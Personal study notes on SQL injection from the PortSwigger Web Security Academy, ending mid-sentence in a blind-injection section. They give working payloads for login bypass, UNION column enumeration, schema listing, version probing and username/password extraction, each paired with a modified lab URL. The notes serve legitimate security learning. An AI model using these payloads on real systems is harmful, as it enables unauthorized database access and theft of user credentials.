# Web Hacking

These are notes that I compiled while learning from the Portswigger academy. The code is from them, although I will modify them according to my needs.

## SQL Injection

### **Retrieving hidden data**

Regular:&#x20;

`https://insecure-website.com/products?category=Gifts`

Modified:

`https://insecure-website.com/products?category=Gifts'--`

**OR**

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

### **Subverting application logic**

Regular:

`SELECT * FROM users WHERE username = 'John' AND password = 'Doe'`

Modified:

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

### **SQL injection UNION attacks**

For a `UNION` query to work, two key requirements must be met:

* The individual queries must return the same number of columns.
* The data types in each column must be compatible between the individual queries.

To determine the number of columns required (to be submitted within the `WHERE` clause of the original query):

`' ORDER BY 1--`&#x20;

`' ORDER BY 2--`&#x20;

`' ORDER BY 3--`&#x20;

`.....`

**OR**

`' UNION SELECT NULL--`&#x20;

`' UNION SELECT NULL,NULL--`&#x20;

`' UNION SELECT NULL,NULL,NULL--`

`.....`

If you get an error for either one and then you'll know how many columns there are.

Regular:

`https://acad1f5f1ebf0bbfc0bd07d0009f009f.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories`

Modified:

`https://acad1f5f1ebf0bbfc0bd07d0009f009f.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27%20UNION%20SELECT%20NULL,NULL,NULL--`

### **Finding columns with a useful data type in an SQL injection UNION attack**

**Replace 'a' with string you are looking for:**

`' UNION SELECT 'a',NULL,NULL,NULL--`&#x20;

`' UNION SELECT NULL,'a',NULL,NULL--`&#x20;

`' UNION SELECT NULL,NULL,'a',NULL--`&#x20;

`' UNION SELECT NULL,NULL,NULL,'a'--`

Regular:

`https://ac1f1f361f395e87c021394c00230079.web-security-academy.net/filter?category=Accessories`

Modified:

`https://ac1f1f361f395e87c021394c00230079.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20NULL,%27FgYUb0%27,NULL--`

### Using an SQL injection UNION attack to retrieve interesting data <a href="#using-an-sql-injection-union-attack-to-retrieve-interesting-data" id="using-an-sql-injection-union-attack-to-retrieve-interesting-data"></a>

The crucial information needed to perform this attack is that there is a table called `users` with two columns called `username` and `password`

`' UNION SELECT username, password FROM users--`

Regular:

`https://ac401f231f831ad7c0283c9800910099.web-security-academy.net/filter?category=Accessories`

Modified:

`ac401f231f831ad7c0283c9800910099.web-security-academy.net/filter?category=Accessories' UNION SELECT username, password FROM users--`

### Retrieving multiple values within a single column <a href="#retrieving-multiple-values-within-a-single-column" id="retrieving-multiple-values-within-a-single-column"></a>

This example is for Oracle DBs:

`' UNION SELECT username || '~' || password FROM users--`

Tip: use the comma to combine two queries&#x20;

Regular:

`https://ac791f681f4f06c8c0f90ed300ca0036.web-security-academy.net/filter?category=Gifts`

Modified:

`https://ac791f681f4f06c8c0f90ed300ca0036.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20NULL,username%20||%20%27~%27%20||%20password%20FROM%20users--`

### Querying the database type and version <a href="#querying-the-database-type-and-version" id="querying-the-database-type-and-version"></a>

| Database Type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

For example, you could use a `UNION` attack with the following input:

`' UNION SELECT @@version--`

Regular:

`https://ac0b1f1d1f62d851c04a61770014009b.web-security-academy.net/filter?category=Gifts`

Modified:

`https://ac0b1f1d1f62d851c04a61770014009b.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

### Listing the database contents on non-Oracle databases

Regular:

`https://ac021f0e1ff14420c0f12314002b00a4.web-security-academy.net/filter?category=Corporate+gifts`

Modified:

See all available tables:

`https://ac021f0e1ff14420c0f12314002b00a4.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

Find the table that you are interested in. Then change the following query with the table (mine was "users\_ddvsxa"):

`https://ac021f0e1ff14420c0f12314002b00a4.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_ddvsxa%27--`

Find the names of the columns containing what you are looking for (usernames/passwords). For me, it was **username\_czehbi** and **password\_jwcmoz** Then modify the following query:

`https://ac021f0e1ff14420c0f12314002b00a4.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+username_czehbi,+password_jwcmoz+FROM+users_ddvsxa--`

### Equivalent to information schema on Oracle <a href="#equivalent-to-information-schema-on-oracle" id="equivalent-to-information-schema-on-oracle"></a>

You can list tables by querying `all_tables`:

`SELECT * FROM all_tables`

And you can list columns by querying `all_tab_columns`:

`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

### Blind SQL injection by triggering conditional responses

Use `AND` to check if condition is inject-able:

`…xyz' AND '1'='1 //True`

`…xyz' AND '1'='2 //False`

Based off the True and False above, you then give statements to test out what is available. To verify if there is a table called **users**, you would do the following:

`Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT 'a' FROM users LIMIT 1)='a;`

Now you know the **users** table exists, if you get a similar response to True above. To check for a username
